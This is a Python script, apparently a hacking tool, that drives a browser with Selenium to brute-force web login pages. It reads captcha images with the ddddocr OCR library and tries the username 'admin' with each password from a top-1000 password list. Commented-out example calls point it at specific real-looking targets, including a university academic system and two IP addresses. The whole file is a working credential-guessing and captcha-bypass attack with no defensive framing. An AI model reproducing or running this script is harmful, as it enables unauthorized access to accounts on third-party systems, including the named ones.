import time

import ddddocr
from selenium import webdriver
from selenium.webdriver.common.by import By

from utils import print_err, print_suc


def brute(url, unamexp, pwdxp, capinputxp, capxp, butxp):
    cdriver = webdriver.Chrome('../chromedriver/chromedriver.exe')  # win c driver
    cdriver.implicitly_wait(100)  # wait
    cdriver.maximize_window()
    cdriver.get(url)
    progress = ''
    i = 0
    f = open('../passwd-top1000.txt', 'r').readlines()
    for it in f:
        i += 1
        progress = '%s/%s' % (i, len(f))
        it = it.replace('\n', '')
        it = it.replace('\r', '')
        it = it.replace('\t', '')
        while True:
            cdriver.find_element(By.XPATH, unamexp).clear()
            cdriver.find_element(By.XPATH, pwdxp).clear()
            cdriver.find_element(By.XPATH, unamexp).send_keys('admin')
            cdriver.find_element(By.XPATH, pwdxp).send_keys(it)  # 输入账号密码
            cdriver.find_element(By.XPATH, capxp).screenshot('temp.png')
            file = open("temp.png", "rb")
            ocr = ddddocr.DdddOcr()
            res = ocr.classification(file.read())  # 验证码识别
            cdriver.find_element(By.XPATH, capinputxp).send_keys(res)  # 输入验证码
            time.sleep(1)
            cdriver.find_element(By.XPATH, butxp).click()  # 提交
            web_body = cdriver.page_source
            time.sleep(3)
            if '密码错误' in web_body:
                print_err('%s:%s - %s错误 %s' % ('admin', it, res, progress))

                cdriver.refresh()
                break
            elif '验证码错误' in web_body:
                pass
            else:
                print_suc('%s:%s - %s成功' % ('admin', it, res))
                time.sleep(100000)


# brute('http://202.198.176.101', unamexp='/html/body/div/div[1]/form/div[1]/input',
#       pwdxp='//*[@id="LAY-user-login-password"]',
#       capinputxp='//*[@id="LAY-user-login-vercode"]', capxp='//*[@id="LAY-user-get-vercode"]',
#       butxp='//*[@id="loginForm"]/div[4]/button')
# brute(unamexp='//*[@id="userAccount"]', pwdxp='//*[@id="userPassword"]', capinputxp='//*[@id="RANDOMCODE"]',
#       capxp='//*[@id="SafeCodeImg"]/img', butxp='/html/body/form/div/div/div[2]/table/tbody/tr[5]/td[3]/input',
#       url='http://ea.ccut.edu.cn/')

url = input('输入url:')
unamexp = input('输入用户名xpath:')
pwdxp = input('输入密码xpath:')
capinputxp = input('输入验证码图片xpath:')
capxp = input('输入验证码输入框xpath:')
butxp = input('输入登录按钮xpath:')
brute(url=url, unamexp=unamexp, pwdxp=pwdxp, capinputxp=capinputxp, capxp=capxp, butxp=butxp)
# brute(url='http://1.180.188.225/login',unamexp='//*[@id="username"]',pwdxp='//*[@id="password"]',capinputxp='//*[@id="captcha"]',capxp='//*[@id="root"]/div/div[3]/div/div[2]/div[1]/form/div[4]/a/img',butxp='/html/body/div/div/div[3]/div/div[2]/div[1]/form/div[5]/button')
